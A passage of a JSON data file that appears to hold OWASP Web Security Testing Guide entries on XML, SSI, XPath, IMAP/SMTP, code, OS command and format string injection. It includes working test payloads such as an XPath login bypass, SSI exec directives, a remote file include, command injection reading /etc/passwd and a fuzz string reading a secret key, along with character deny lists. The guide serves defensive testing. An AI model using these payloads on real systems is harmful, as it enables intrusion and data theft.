</mail> <userid> 0 </userid> <mail> [email protected] </mail> </user> </users></code></pre><p>The resulting XML file is well formed. Furthermore, it is likely that, for the user tony, the value associated with the userid tag is the one appearing last, i.e., 0 (the admin ID). In other words, we have injected a user with administrative privileges.</p><p>The only problem is that the userid tag appears twice in the last user node. Often, XML documents are associated with a schema or a DTD and will be rejected if they don’t comply with it.</p><p>Let’s suppose that the XML document is specified by the following DTD:</p><pre><code><!DOCTYPE users [\n    <!ELEMENT users (user+) > <!ELEMENT user (username,password,userid,mail+) > <!ELEMENT username (#PCDATA) > <!ELEMENT password (#PCDATA) > <!ELEMENT userid (#PCDATA) > <!ELEMENT mail (#PCDATA) > ]></code></pre><p>Note that the userid node is defined with cardinality 1. In this case, the attack we have shown before (and other simple attacks) will not work, if the XML document is validated against its DTD before any processing occurs.</p><p>However, this problem can be solved, if the tester controls the value of some nodes preceding the offending node (userid, in this example). In fact, the tester can comment out such node, by injecting a comment start/end sequence:</p><pre><code>Username: tony\nPassword: Un6R34kb!e</password><!--\nE-mail: --><userid>0</userid><mail> [email protected]</code></pre><p>In this case, the final XML database is:</p><pre><code><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <users> <user> <username> gandalf </username> <password> !c3 </password> <userid> 0 </userid> <mail> [email protected] </mail> </user> <user> <username> Stefan0 </username> <password> w1s3c </password> <userid> 500 </userid> <mail> [email protected] </mail> </user> <user> <username> tony </username> <password> Un6R34kb!e </password> <!--</password>\n        <userid>500</userid>\n        <mail>--> <userid> 0 </userid><mail> [email protected] </mail> </user> </users></code></pre><p>The original userid node has been commented out, leaving only the injected one. The document now complies with its DTD rules.</p><h3>Source Code Review</h3><p>The following Java API may be vulnerable to XXE if they are not configured properly.</p><pre><code>javax.xml.parsers.DocumentBuilder\njavax.xml.parsers.DocumentBuildFactory\norg.xml.sax.EntityResolver\norg.dom4j.*\njavax.xml.parsers.SAXParser\njavax.xml.parsers.SAXParserFactory\nTransformerFactory\nSAXReader\nDocumentHelper\nSAXBuilder\nSAXParserFactory\nXMLReaderFactory\nXMLInputFactory\nSchemaFactory\nDocumentBuilderFactoryImpl\nSAXTransformerFactory\nDocumentBuilderFactoryImpl\nXMLReader\nXerces: DOMParser, DOMParserImpl, SAXParser, XMLParser</code></pre><p>Check source code if the docType, external DTD, and external parameter entities are set as forbidden uses.</p><ul><li>XML External Entity (XXE) Prevention Cheat Sheet</li></ul><p>In addition, the Java POI office reader may be vulnerable to XXE if the version is under 3.10.1.</p><p>The version of POI library can be identified from the filename of the JAR. For example,</p><ul><li>poi-3.8.jar</li><li>poi-ooxml-3.8.jar</li></ul><p>The followings source code keyword may apply to C.</p><ul><li>libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO</li><li>libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader</li></ul>",
        "tools": "<h3>Tools</h3><ul><li>XML Injection Fuzz Strings (from wfuzz tool)</li></ul><h3>References</h3><ul><li>XML Injection</li><li>Gregory Steuck, “XXE (Xml eXternal Entity) attack”</li><li>OWASP XXE Prevention Cheat Sheet</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-08": {
        "summary": "<h3>Summary</h3><p>Web servers usually give developers the ability to add small pieces of dynamic code inside static HTML pages, without having to deal with full-fledged server-side or client-side languages. This feature is provided by Server-Side Includes (SSI).</p><p>Server-Side Includes are directives that the web server parses before serving the page to the user. They represent an alternative to writing CGI programs or embedding code using server-side scripting languages, when there’s only need to perform very simple tasks. Common SSI implementations provide directives (commands) to include external files, to set and print web server CGI environment variables, or to execute external CGI scripts or system commands.</p><p>SSI can lead to a Remote Command Execution (RCE), however most webservers have the exec directive disabled by default.</p><p>This is a vulnerability very similar to a classical scripting language injection vulnerability. One mitigation is that the web server needs to be configured to allow SSI. On the other hand, SSI injection vulnerabilities are often simpler to exploit, since SSI directives are easy to understand and, at the same time, quite powerful, e.g., they can output the content of files and execute system commands.</p><h3>Test Objectives</h3><ul><li>Identify SSI injection points.</li><li>Assess the severity of the injection.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>To test for exploitable SSI, inject SSI directives as user input. If SSI are enabled and user input validation has not been properly implemented, the server will execute the directive. This is very similar to a classical scripting language injection vulnerability in that it occurs when user input is not properly validated and sanitized.</p><p>First determine if the web server supports SSI directives. Often, the answer is yes, as SSI support is quite common. To determine if SSI directives are supported, discover the type of web server that the target is running using information gathering techniques (see Fingerprint Web Server ). If you have access to the code, determine if SSI directives are used by searching through the webserver configuration files for specific keywords.</p><p>Another way of verifying that SSI directives are enabled is by checking for pages with the .shtml extension, which is associated with SSI directives. The use of the .shtml extension is not mandatory, so not having found any .shtml files doesn’t necessarily mean that the target is not vulnerable to SSI injection attacks.</p><p>The next step is determining all the possible user input vectors and testing to see if the SSI injection is exploitable.</p><p>First find all the pages where user input is allowed. Possible input vectors may also include headers and cookies. Determine how the input is stored and used, i.e if the input is returned as an error message or page element and if it was modified in some way. Access to the source code can help you to more easily determine where the input vectors are and how input is handled.</p><p>Once you have a list of potential injection points, you may determine if the input is correctly validated. Ensure it is possible to inject characters used in SSI directives such as <!#=/.\"-> and [a-zA-Z0-9]</p><p>The below example returns the value of the variable. The references section has helpful links with server-specific documentation to help you better assess a particular system.</p><pre><code><!--#echo var=\"VAR\" --></code></pre><p>When using the include directive, if the supplied file is a CGI script, this directive will include the output of the CGI script. This directive may also be used to include the content of a file or list files in a directory:</p><pre><code><!--#include virtual=\"FILENAME\" --></code></pre><p>To return the output of a system command:</p><pre><code><!--#exec cmd=\"OS_COMMAND\" --></code></pre><p>If the application is vulnerable, the directive is injected and it would be interpreted by the server the next time the page is served.</p><p>The SSI directives can also be injected in the HTTP headers, if the web application is using that data to build a dynamically generated page:</p><pre><code>GET / HTTP/1.1\nHost: www.example.com\nReferer: <!--#exec cmd=\"/bin/ps ax\"-->\nUser-Agent: <!--#include virtual=\"/proc/version\"--></code></pre>",
        "tools": "<h3>Tools</h3><ul><li>Web Proxy Burp Suite</li><li>ZAP</li><li>String searcher: grep</li></ul><h3>References</h3><ul><li>Nginx SSI module</li><li>Apache: Module mod_include</li><li>IIS: Server-Side Includes directives</li><li>Apache Tutorial: Introduction to Server-Side Includes</li><li>Apache: Security Tips for Server Configuration</li><li>SSI Injection instead of JavaScript Malware</li><li>IIS: Notes on Server-Side Includes (SSI) syntax</li><li>Header Based Exploitation</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-09": {
        "summary": "<h3>Summary</h3><p>XPath is a language that has been designed and developed primarily to address parts of an XML document. In XPath injection testing, we test if it is possible to inject XPath syntax into a request interpreted by the application, allowing an attacker to execute user-controlled XPath queries. When successfully exploited, this vulnerability may allow an attacker to bypass authentication mechanisms or access information without proper authorization.</p><p>Web applications heavily use databases to store and access the data they need for their operations. Historically, relational databases have been by far the most common technology for data storage, but, in the last years, we are witnessing an increasing popularity for databases that organize data using the XML language. Just like relational databases are accessed via SQL language, XML databases use XPath as their standard query language.</p><p>Since, from a conceptual point of view, XPath is very similar to SQL in its purpose and applications, an interesting result is that XPath injection attacks follow the same logic as SQL Injection attacks. In some aspects, XPath is even more powerful than standard SQL, as its whole power is already present in its specifications, whereas a large number of the techniques that can be used in a SQL Injection attack depend on the characteristics of the SQL dialect used by the target database. This means that XPath injection attacks can be much more adaptable and ubiquitous. Another advantage of an XPath injection attack is that, unlike SQL, no ACLs are enforced, as our query can access every part of the XML document.</p><h3>Test Objectives</h3><ul><li>Identify XPATH injection points.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>The XPath attack pattern was first published by Amit Klein and is very similar to the usual SQL Injection. In order to get a first grasp of the problem, let’s imagine a login page that manages the authentication to an application in which the user must enter their username and password. Let’s assume that our database is represented by the following XML file:</p><pre><code><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <users> <user> <username> gandalf </username> <password> !c3 </password> <account> admin </account> </user> <user> <username> Stefan0 </username> <password> w1s3c </password> <account> guest </account> </user> <user> <username> tony </username> <password> Un6R34kb!e </password> <account> guest </account> </user> </users></code></pre><p>An XPath query that returns the account whose username is gandalf and the password is !c3 would be the following:</p><p>string(//user[username/text()='gandalf' and password/text()='!c3']/account/text())</p><p>If the application does not properly filter user input, the tester will be able to inject XPath code and interfere with the query result. For instance, the tester could input the following values:</p><pre><code>Username: ' or '1' = '1\nPassword: ' or '1' = '1</code></pre><p>Looks quite familiar, doesn’t it? Using these parameters, the query becomes:</p><p>string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text())</p><p>As in a common SQL Injection attack, we have created a query that always evaluates to true, which means that the application will authenticate the user even if a username or a password have not been provided. And as in a common SQL Injection attack, with XPath injection, the first step is to insert a single quote ( ' ) in the field to be tested, introducing a syntax error in the query, and to check whether the application returns an error message.</p><p>If there is no knowledge about the XML data internal details and if the application does not provide useful error messages that help us reconstruct its internal logic, it is possible to perform a Blind XPath Injection attack, whose goal is to reconstruct the whole data structure. The technique is similar to inference based SQL Injection, as the approach is to inject code that creates a query that returns one bit of information. Blind XPath Injection is explained in more detail by Amit Klein in the referenced paper.</p><h3>References</h3><ul><li>Amit Klein: “Blind XPath Injection”</li><li>XPath 1.0 specifications</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-10": {
        "summary": "<h3>Summary</h3><p>This threat affects all applications that communicate with mail servers (IMAP/SMTP), generally webmail applications. The aim of this test is to verify the capacity to inject arbitrary IMAP/SMTP commands into the mail servers, due to input data not being properly sanitized.</p><p>The IMAP/SMTP Injection technique is more effective if the mail server is not directly accessible from Internet. Where full communication with the backend mail server is possible, it is recommended to conduct direct testing.</p><p>An IMAP/SMTP Injection makes it possible to access a mail server which otherwise would not be directly accessible from the Internet. In some cases, these internal systems do not have the same level of infrastructure security and hardening that is applied to the front-end web servers. Therefore, mail server results may be more vulnerable to attacks by end users (see the scheme presented in Figure 1).</p><p>Figure 4.7.10-1: Communication with the mail servers using the IMAP/SMTP Injection technique</p><br><p>Figure 1 depicts the flow of traffic generally seen when using webmail technologies. Step 1 and 2 is the user interacting with the webmail client, whereas step 2 is the tester bypassing the webmail client and interacting with the back-end mail servers directly.</p><p>This technique allows a wide variety of actions and attacks. The possibilities depend on the type and scope of injection and the mail server technology being tested.</p><p>Some examples of attacks using the IMAP/SMTP Injection technique are:</p><ul><li>Exploitation of vulnerabilities in the IMAP/SMTP protocol</li><li>Application restrictions evasion</li><li>Anti-automation process evasion</li><li>Information leaks</li><li>Relay/SPAM</li></ul><h3>Test Objectives</h3><ul><li>Identify IMAP/SMTP injection points.</li><li>Understand the data flow and deployment structure of the system.</li><li>Assess the injection impacts.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>In order to detect vulnerable parameters, the tester has to analyze the application’s ability in handling input. Input validation testing requires the tester to send bogus, or malicious, requests to the server and analyse the response. In a secure application, the response should be an error with some corresponding action telling the client that something has gone wrong. In a vulnerable application, the malicious request may be processed by the back-end application that will answer with a HTTP 200 OK response message.</p><p>It is important to note that the requests being sent should match the technology being tested. Sending SQL injection strings for Microsoft SQL server when a MySQL server is being used will result in false positive responses. In this case, sending malicious IMAP commands is modus operandi since IMAP is the underlying protocol being tested.</p><p>IMAP special parameters that should be used are:</p><p>In this example, the “mailbox” parameter is being tested by manipulating all requests with the parameter in:</p><p>https://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=46106&startMessage=1</p><p>The following examples can be used.</p><ul><li>Assign a null value to the parameter:</li></ul><p>https://<webmail>/src/read_body.php?mailbox=&passed_id=46106&startMessage=1</p><ul><li>Substitute the value with a random value:</li></ul><p>https://<webmail>/src/read_body.php?mailbox=NOTEXIST&passed_id=46106&startMessage=1</p><ul><li>Add other values to the parameter:</li></ul><p>https://<webmail>/src/read_body.php?mailbox=INBOX PARAMETER2&passed_id=46106&startMessage=1</p><ul><li>Add non-standard special characters (i.e.:\\,',\",@,#,!,|):</li></ul><p>https://<webmail>/src/read_body.php?mailbox=INBOX\"&passed_id=46106&startMessage=1</p><ul><li>Eliminate the parameter:</li></ul><p>https://<webmail>/src/read_body.php?passed_id=46106&startMessage=1</p><p>The final result of the above testing gives the tester three possible situations:\nS1 - The application returns a error code/message\nS2 - The application does not return an error code/message, but it does not realize the requested operation\nS3 - The application does not return an error code/message and realizes the operation requested normally</p><p>Situations S1 and S2 represent successful IMAP/SMTP injection.</p><p>An attacker’s aim is receiving the S1 response, as it is an indicator that the application is vulnerable to injection and further manipulation.</p><p>Let’s suppose that a user retrieves the email headers using the following HTTP request:</p><p>https://<webmail>/src/view_header.php?mailbox=INBOX&passed_id=46105&passed_ent_id=0</p><p>An attacker might modify the value of the parameter INBOX by injecting the character \" (%22 using URL encoding):</p><p>https://<webmail>/src/view_header.php?mailbox=INBOX%22&passed_id=46105&passed_ent_id=0</p><p>In this case, the application answer may be:</p><pre><code>ERROR: Bad or malformed request.\nQuery: SELECT \"INBOX\"\"\nServer responded: Unexpected extra arguments to Select</code></pre><p>The situation S2 is harder to test successfully. The tester needs to use blind command injection in order to determine if the server is vulnerable.</p><p>On the other hand, the last situation (S3) is not relevant in this paragraph.</p><p>List of vulnerable parameters</p><ul><li>Affected functionality</li><li>Type of possible injection (IMAP/SMTP)</li></ul><p>After identifying all vulnerable parameters (for example, passed_id ), the tester needs to determine what level of injection is possible and then design a testing plan to further exploit the application.</p><p>In this test case, we have detected that the application’s passed_id parameter is vulnerable and is used in the following request:</p><p>https://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=46225&startMessage=1</p><p>Using the following test case (providing an alphabetical value when a numerical value is required):</p><p>https://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=test&startMessage=1</p><p>will generate the following error message:</p><pre><code>ERROR : Bad or malformed request.\nQuery: FETCH test:test BODY[HEADER]\nServer responded: Error in IMAP command received by server.</code></pre><p>In this example, the error message returned the name of the executed command and the corresponding parameters.</p><p>In other situations, the error message ( not controlled by the application) contains the name of the executed command, but reading the suitable RFC allows the tester to understand what other possible commands can be executed.</p><p>If the application does not return descriptive error messages, the tester needs to analyze the affected functionality to deduce all the possible commands (and parameters) associated with the above mentioned functionality. For example, if a vulnerable parameter has been detected in the create mailbox functionality, it is logical to assume that the affected IMAP command is CREATE . According to the RFC, the CREATE command accepts one parameter which specifies the name of the mailbox to create.</p><p>List of IMAP/SMTP commands affected</p><ul><li>Type, value, and number of parameters expected by the affected IMAP/SMTP commands</li></ul><p>Once the tester has identified vulnerable parameters and has analyzed the context in which they are executed, the next stage is exploiting the functionality.</p><p>This stage has two possible outcomes:</p><p>In any case, the typical structure of an IMAP/SMTP Injection is as follows:</p><ul><li>Header: ending of the expected command;</li><li>Body: injection of the new command;</li><li>Footer: beginning of the expected command.</li></ul><p>It is important to remember that, in order to execute an IMAP/SMTP command, the previous command must be terminated with the CRLF ( %0d%0a ) sequence.</p><p>Let’s suppose that in the Identifying vulnerable parameters stage, the attacker detects that the parameter message_id in the following request is vulnerable:</p><p>https://<webmail>/read_email.php?message_id=4791</p><p>Let’s suppose also that the outcome of the analysis performed in the stage 2 (“Understanding the data flow and deployment structure of the client”) has identified the command and arguments associated with this parameter as:</p><p>FETCH 4791 BODY[HEADER]</p><p>In this scenario, the IMAP injection structure would be:</p><p>https://<webmail>/read_email.php?message_id=4791 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 4791</p><p>Which would generate the following commands:</p><pre><code>???? FETCH 4791 BODY [ HEADER ] V100 CAPABILITY V101 FETCH 4791 BODY [ HEADER ]</code></pre><p>where:</p><pre><code>Header = 4791 BODY [ HEADER ] Body = % 0 d % 0 aV100 CAPABILITY % 0 d % 0 a Footer = V101 FETCH 4791</code></pre><p>List of IMAP/SMTP commands affected</p><ul><li>Arbitrary IMAP/SMTP command injection</li></ul><h3>References</h3><ul><li>RFC 0821 “Simple Mail Transfer Protocol”</li><li>RFC 3501 “Internet Message Access Protocol - Version 4rev1”</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-11": {
        "summary": "<h3>Summary</h3><p>This section describes how a tester can check if it is possible to enter code as input on a web page and have it executed by the web server.</p><p>In Code Injection testing, a tester submits input that is processed by the web server as dynamic code or as an included file. These tests can target various server-side scripting engines, e.g., ASP or PHP. Proper input validation and secure coding practices need to be employed to protect against these attacks.</p><h3>Test Objectives</h3><ul><li>Identify injection points where you can inject code into the application.</li><li>Assess the injection severity.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Using the querystring, the tester can inject code (in this example, a malicious URL) to be processed as part of the included file:</p><p>https://www.example.com/uptime.php?pin=https://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a</p><p>The malicious URL is accepted as a parameter for the PHP page, which will later use the value in an included file.</p><p>Examine ASP code for user input used in execution functions. Can the user enter commands into the Data input field? Here, the ASP code will save the input to a file and then execute it:</p><pre><code><%\nIf not isEmpty(Request( \"Data\" ) ) Then\nDim fso, f\n'User input Data is written to a file named data.txt\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet f = fso.OpenTextFile(Server.MapPath( \"data.txt\" ), 8, True)\nf.Write Request(\"Data\") & vbCrLf\nf.close\nSet f = nothing\nSet fso = Nothing\n\n'Data.txt is executed\nServer.Execute( \"data.txt\" )\n\nElse\n%>\n\n<form>\n<input name=\"Data\" /><input type=\"submit\" name=\"Enter Data\" />\n\n</form>\n<%\nEnd If\n%>)))</code></pre><ul><li>Insecure.org</li><li>Wikipedia</li><li>Reviewing Code for OS Injection</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-12": {
        "summary": "<h3>Summary</h3><p>This article describes how to test an application for OS command injection. The tester will try to inject an OS command through an HTTP request to the application.</p><p>OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands. Any web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords. OS command injection is preventable when security is emphasized during the design and development of applications.</p><h3>Test Objectives</h3><ul><li>Identify and assess the command injection points.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>When viewing a file in a web application, the filename is often shown in the URL. Perl allows piping data from a process into an open statement. The user can simply append the Pipe symbol | onto the end of the filename.</p><p>Example URL before alteration:</p><p>https://sensitive/cgi-bin/userData.pl?doc=user1.txt</p><p>Example URL modified:</p><p>https://sensitive/cgi-bin/userData.pl?doc=/bin/ls|</p><p>This will execute the command /bin/ls .</p><p>Appending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. %3B is URL encoded and decodes to semicolon</p><p>Example:</p><p>https://sensitive/something.php?dir=%3Bcat%20/etc/passwd</p><p>Consider the case of an application that contains a set of documents that you can browse from the Internet. If you fire up a personal proxy (such as ZAP or Burp Suite), you can obtain a POST HTTP like the following ( https://www.example.com/public/doc ):</p><pre><code>POST /public/doc HTTP/1.1\nHost: www.example.com\n[...]\nReferer: https://127.0.0.1/WebGoat/attack?Screen=20\nCookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5\nAuthorization: Basic T2Vbc1Q9Z3V2Tc3e=\nContent-Type: application/x-www-form-urlencoded\nContent-length: 33\n\nDoc=Doc1.pdf</code></pre><p>In this post request, we notice how the application retrieves the public documentation. Now we can test if it is possible to add an operating system command to inject in the POST HTTP. Try the following ( https://www.example.com/public/doc ):</p><pre><code>POST /public/doc HTTP/1.1\nHost: www.example.com\n[...]\nReferer: https://127.0.0.1/WebGoat/attack?Screen=20\nCookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5\nAuthorization: Basic T2Vbc1Q9Z3V2Tc3e=\nContent-Type: application/x-www-form-urlencoded\nContent-length: 33\n\nDoc=Doc1.pdf+|+Dir c:\\</code></pre><p>If the application doesn’t validate the request, we can obtain the following result:</p><pre><code>Exec Results for 'cmd.exe /c type \"C:\\httpd\\public\\doc\\\"Doc=Doc1.pdf+|+Dir c:\\'\n    Output...\n    Il volume nell'unità C non ha etichetta.\n    Numero di serie Del volume: 8E3F-4B61\n    Directory of c:\\\n     18/10/2006 00:27 2,675 Dir_Prog.txt\n     18/10/2006 00:28 3,887 Dir_ProgFile.txt\n     16/11/2006 10:43\n        Doc\n        11/11/2006 17:25\n           Documents and Settings\n           25/10/2006 03:11\n              I386\n              14/11/2006 18:51\n             h4ck3r\n             30/09/2005 21:40 25,934\n            OWASP1.JPG\n            03/11/2006 18:29\n                Prog\n                18/11/2006 11:20\n                    Program Files\n                    16/11/2006 21:12\n                        Software\n                        24/10/2006 18:25\n                            Setup\n                            24/10/2006 23:37\n                                Technologies\n                                18/11/2006 11:14\n                                3 File 32,496 byte\n                                13 Directory 6,921,269,248 byte disponibili\n                                Return code: 0</code></pre><p>In this case, we have successfully performed an OS injection attack.</p><h3>Special Characters for Command Injection</h3><p>The following special character can be used for command injection such as | ; & $ > < ' !</p><ul><li>cmd1|cmd2: Uses of|will make command 2 to be executed whether command 1 execution is successful or not.</li><li>cmd1;cmd2: Uses of;will make command 2 to be executed whether command 1 execution is successful or not.</li><li>cmd1||cmd2: Command 2 will only be executed if command 1 execution fails.</li><li>cmd1&&cmd2: Command 2 will only be executed if command 1 execution succeeds.</li><li>$(cmd): For example,echo $(whoami)or$(touch test.sh; echo 'ls' > test.sh)</li><li>cmd: It’s used to execute a specific command. For example,whoami</li><li>>(cmd):>(ls)</li><li><(cmd):<(ls)</li></ul><h3>Code Review Dangerous API</h3><p>Be aware of the uses of following API as it may introduce the command injection risks.</p><ul><li>Runtime.exec()</li></ul><ul><li>system</li><li>exec</li><li>ShellExecute</li></ul><ul><li>exec</li><li>eval</li><li>os.system</li><li>os.popen</li><li>subprocess.popen</li><li>subprocess.call</li></ul><ul><li>system</li><li>shell_exec</li><li>exec</li><li>proc_open</li><li>eval</li></ul>",
        "tools": "<h3>Tools</h3><ul><li>OWASPWebGoat</li><li>Commix</li></ul><h3>References</h3><ul><li>Penetration Testing for Web Applications (Part Two)</li><li>CWE-78: Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)</li><li>ENV33-C. Do not call system()</li></ul>",
        "remediation": "<h3>Remediation</h3><p>The URL and form data needs to be sanitized for invalid characters. A deny list of characters is an option but it may be difficult to think of all of the characters to validate against. Also there may be some that were not discovered as of yet. An allow list containing only allowable characters or command list should be created to validate the user input. Characters that were missed, as well as undiscovered threats, should be eliminated by this list.</p><p>General deny list to be included for command injection can be | ; & $ > < ' \\ ! >> #</p><p>Escape or filter special characters for windows, ( ) < > & * ‘ | = ? ; [ ] ^ ~ ! . \" % @ / \\ : + , ` Escape or filter special characters for Linux, { } ( ) > < & * ‘ | = ? ; [ ] $ – # ~ ! . \" % / \\ : + , `</p><p>The web application and its components should be running under strict permissions that do not allow operating system command execution. Try to verify all this information to test from a gray-box testing point of view.</p>",
        "test_objectives": ""
    },
    "WSTG-INPV-13": {
        "summary": "<h3>Summary</h3><p>A format string is a null-terminated character sequence that also contains conversion specifiers interpreted or converted at runtime. If server-side code concatenates a user’s input with a format string , an attacker can append additional conversion specifiers to cause a runtime error, information disclosure, or buffer overflow.</p><p>The worst case for format strings vulnerabilities occur in languages that don’t check arguments and also include a %n specifier that writes to memory. These functions, if exploited by an attacker modifying a format string, could cause information disclosure and code execution :</p><ul><li>C and C++printfand similar methods fprintf, sprintf, snprintf</li><li>Perlprintfand sprintf</li></ul><p>These format string functions cannot write to memory, but attackers can still cause information disclosure by changing format strings to output values the developers did not intend to send:</p><ul><li>Python 2.6 and 2.7str.formatand Python 3 unicodestr.formatcan be modified by injecting strings that can point toother variablesin memory</li></ul><p>The following format string functions can cause runtime errors if the attacker adds conversion specifiers:</p><ul><li>JavaString.formatandPrintStream.format</li><li>PHPprintf</li></ul><p>The code pattern that causes a format string vulnerability is a call to a string format function that contains unsanitized user input. The following example shows how a debug printf could make a program vulnerable:</p><p>The example in C:</p><pre><code>char * userName = /* input from user controlled field */ ; printf ( \"DEBUG Current user: \" ); // Vulnerable debugging code printf ( userName );</code></pre><p>The example in Java:</p><pre><code>final String userName = /* input from user controlled field */ ; System . out . printf ( \"DEBUG Current user: \" ); // Vulnerable code: System . out . printf ( userName );</code></pre><p>In this particular example, if the attacker set their userName to have one or more conversion specifiers, there would be unwanted behavior. The C example would print out memory contents if userName contained %p%p%p%p%p , and it can corrupt memory contents if there is a %n in the string. In the Java example, a username containing any specifier that needs an input (including %x or %s ) would cause the program to crash with IllegalFormatException . Although the examples are still subject to other problems, the vulnerability can be fixed by printf arguments of printf(\"DEBUG Current user: %s\", userName) .</p><h3>Test Objectives</h3><ul><li>Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behavior from the application.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Tests include analysis of the code and injecting conversion specifiers as user input to the application under test.</p><p>Static analysis tools can find format string vulnerabilities in either the code or in binaries. Examples of tools include:</p><ul><li>C and C++:Flawfinder</li><li>Java: FindSecurityBugs ruleFORMAT_STRING_MANIPULATION</li><li>PHP: String formatter Analyzer inphpsa</li></ul><p>Static analysis may miss more subtle cases including format strings generated by complex code. To look for vulnerabilities manually in a codebase, a tester can look for all calls in the codebase that accept a format string and trace back to make sure untrusted input cannot change the format string.</p><p>Testers can check at the unit test or full system test level by sending conversion specifiers in any string input. Fuzz the program using all of the conversion specifiers for all languages the system under test uses. See the OWASP Format string attack page for possible inputs to use. If the test fails, the program will crash or display an unexpected output. If the test passes, the attempt to send a conversion specifier should be blocked, or the string should go through the system with no issues as with any other valid input.</p><p>The examples in the following subsections have a URL of this form:</p><p>https://vulnerable_host/userinfo?username=x</p><ul><li>The user-controlled value isx(for theusernameparameter).</li></ul><p>Testers can perform a manual test using a web browser or other web API debugging tools. Browse to the web application or site such that the query has conversion specifiers. Note that most conversion specifiers need encoding if sent inside a URL because they contain special characters including % and { . The test can introduce a string of specifiers %s%s%s%n by browsing with the following URL:</p><p>https://vulnerable_host/userinfo?username=%25s%25s%25s%25n</p><p>If the web site is vulnerable, the browser or tool should receive an error, which may include a timeout or an HTTP return code 500.</p><p>The Java code returns the error</p><p>java.util.MissingFormatArgumentException: Format specifier '%s'</p><p>Depending on the C implementation, the process may crash completely with Segmentation Fault .</p><p>Fuzzing tools including wfuzz can automate injection tests. For wfuzz, start with a text file (fuzz.txt in this example) with one input per line:</p><p>fuzz.txt:</p><pre><code>alice\n%s%s%s%n\n%p%p%p%p%p\n{event.__init__.__globals__[CONFIG][SECRET_KEY]}</code></pre><p>The fuzz.txt file contains the following:</p><ul><li>A valid inputaliceto verify the application can process a normal input</li><li>Two strings with C-like conversion specifiers</li><li>One Python conversion specifier to attempt to read global variables</li></ul><p>To send the fuzzing input file to the web application under test, use the following command:</p><p>wfuzz -c -z file,fuzz.txt,urlencode https://vulnerable_host/userinfo?username=FUZZ</p><p>In the above call, the urlencode argument enables the appropriate escaping for the strings and FUZZ (with the capital letters) tells the tool where to introduce the inputs.</p><p>An example output is as follows</p><pre><code>ID           Response   Lines    Word     Chars       Payload\n===================================================================\n\n000000002:   500        0 L      5 W      142 Ch      \"%25s%25s%25s%25n\"\n000000003:   500        0 L      5 W      137 Ch      \"%25p%25p%25p%25p%25p\"\n000000004:   200        0 L      1 W      48 Ch       \"%7Bevent.__init__.__globals__%5BCONFIG%5D%5BSECRET_KEY%5D%7D\"\n000000001:   200        0 L      1 W      5 Ch        \"alice\"</code></pre><p>The above result validates the application’s weakness to the injection of C-like conversion specifiers %s and %p .</p>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-14": {
        "summary": "<h3>Summary</h3><p>Also often referred to as persistent attacks, incubated testing is a complex testing method that needs more than one data validation vulnerability to work. Incubated vulnerabilities are typically used to conduct “watering hole” attacks against users of legitimate web applications.</p><p>Incubated vulnerabilities have the following characteristics:</p><ul><li>The attack vector needs to be persisted in the first place, it needs to be stored in the persistence layer, and this would only occur if weak data validation was present or the data arrived into the system via another channel such as an admin console or directly via a backend batch process.</li><li>Secondly, once the attack vector was “recalled” the vector would need to be executed successfully. For example, an incubated XSS attack would require weak output validation so the script would be delivered to the client in its executable form.</li></ul><p>Exploitation of some vulnerabilities, or even functional features of a web application, will allow an attacker to plant a piece of data that will later be retrieved by an unsuspecting user or other component of the system, exploiting some vulnerability there.</p><p>In a penetration test, incubated attacks can be used to assess the criticality of certain bugs, using the particular security issue found to build a client-side based attack that usually will be used to target a large number of victims at the same time (i.e. all users browsing the site).</p><p>This type of asynchronous attack covers a great spectrum of attack vectors, among them the following:</p><ul><li>File upload components in a web application, allowing the attacker to upload corrupted media files (JPEG images exploitingCVE-2004-0200, PNG images exploitingCVE-2004-0597, executable files, site pages with active component, etc.)</li><li>Cross-site scripting issues in public forums posts (seeTesting for Stored Cross Site Scriptingfor additional details). An attacker could potentially store malicious scripts or code in a repository in the backend of the web-application (e.g., a database) so that this script/code gets executed by one of the users (end users, administrators, etc). The archetypical incubated attack is exemplified by using a cross-site scripting vulnerability in a user forum, bulletin board, or blog in order to inject some JavaScript code at the vulnerable page, and will be eventually rendered and executed at the site user’s browser –using the trust level of the original (vulnerable) site at the user’s browser.</li><li>SQL/XPATH Injection allowing the attacker to upload content to a database, which will be later retrieved as part of the active content in a web page. For example, if the attacker can post arbitrary JavaScript in a bulletin board so that it gets executed by users, then he might take control of their browsers (e.g.,XSS-proxy).</li><li>Misconfigured servers allowing installation of Java packages or similar site components (i.e. Tomcat, or web hosting consoles such as Plesk, CPanel, Helm, etc.)</li></ul><h3>Test 